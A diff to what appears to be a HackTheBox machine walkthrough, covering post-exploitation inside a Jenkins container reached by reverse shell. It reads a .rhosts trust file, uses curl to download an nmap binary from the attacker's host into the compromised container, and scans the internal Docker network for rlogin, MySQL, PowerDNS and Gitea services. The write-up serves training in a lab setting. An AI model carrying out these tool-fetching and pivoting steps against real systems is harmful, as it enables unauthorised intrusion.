@@ -546,5 +546,112 @@ root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main#
 
 <br />
 
-We received a reverse shell as the root user inside the Jenkins container, confirming remote code execution through the CI/CD pipeline. 
+We received a reverse shell as the root user inside the Jenkins container, confirming remote code execution through the CI/CD pipeline.
 
+We know we're in a container because of the alphanumeric string in the hostname:
+
+<br />
+
+```bash
+root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main# hostname
+5ac6c7d6fb8e
+```
+
+<br />
+
+After a further enumeration, the container doesn't have any privileged information such as credentials or something similar.
+
+### rhosts
+
+The most interesting is a `rhosts` file inside the `/root` directory. As we know, this file indicates the allowed hosts to connect via `rlogin` to the principal machine without giving a password:
+
+<br />
+
+```bash
+root@5ac6c7d6fb8e:~# cat .rhosts 
+admin.build.vl +
+intern.build.vl +
+```
+
+<br />
+
+## Internal Network
+
+<br />
+
+One peculiarity of this machine is that it has an internal network. In my case, I had never before seen a machine on HackTheBox that required you to enumerate an internal network, so it took me a bit by surprise when I solved the machine for the first time.
+
+To enumerate this network we will bring the following [nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) static binary to the container and our `/etc/services` file, that is neccessary to run the scans.
+
+
+```bash
+curl http://10.10.14.253/nmap -o nmap
+curl http://10.10.14.253/services -o /etc/services
+```
+
+<br />
+
+Now, we can run the `nmap` scan to discover the internal network:
+
+<br />
+
+```bash
+root@5ac6c7d6fb8e:/tmp/test# ./nmap 172.18.0.0/24 --min-rate 5000
+
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2026-01-09 11:30 UTC
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for 172.18.0.1
+Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
+Host is up (0.000021s latency).
+Not shown: 1148 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+53/tcp   open  domain
+512/tcp  open  exec
+513/tcp  open  login
+514/tcp  open  shell
+873/tcp  open  rsync
+3306/tcp open  mysql
+8081/tcp open  tproxy
+MAC Address: 02:42:F7:1A:3A:15 (Unknown)
+
+Nmap scan report for gitea.custom (172.18.0.2)
+Host is up (0.000032s latency).
+Not shown: 1155 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+MAC Address: 02:42:AC:12:00:02 (Unknown)
+
+Nmap scan report for pdns-db-1.custom (172.18.0.4)
+Host is up (0.000031s latency).
+Not shown: 1155 closed ports
+PORT     STATE SERVICE
+3306/tcp open  mysql
+MAC Address: 02:42:AC:12:00:04 (Unknown)
+
+Nmap scan report for pdns-pdns-1.custom (172.18.0.5)
+Host is up (0.000032s latency).
+Not shown: 1154 closed ports
+PORT     STATE SERVICE
+53/tcp   open  domain
+8081/tcp open  tproxy
+MAC Address: 02:42:AC:12:00:05 (Unknown)
+
+Nmap scan report for powerdns_admin.custom (172.18.0.6)
+Host is up (0.000033s latency).
+Not shown: 1155 closed ports
+PORT   STATE SERVICE
+80/tcp open  http
+MAC Address: 02:42:AC:12:00:06 (Unknown)
+
+Nmap scan report for 5ac6c7d6fb8e (172.18.0.3)
+Host is up (0.000018s latency).
+Not shown: 1155 closed ports
+PORT     STATE SERVICE
+8080/tcp open  http-alt
+
+Nmap done: 256 IP addresses (6 hosts up) scanned in 3.33 seconds
+```
+
+<br />
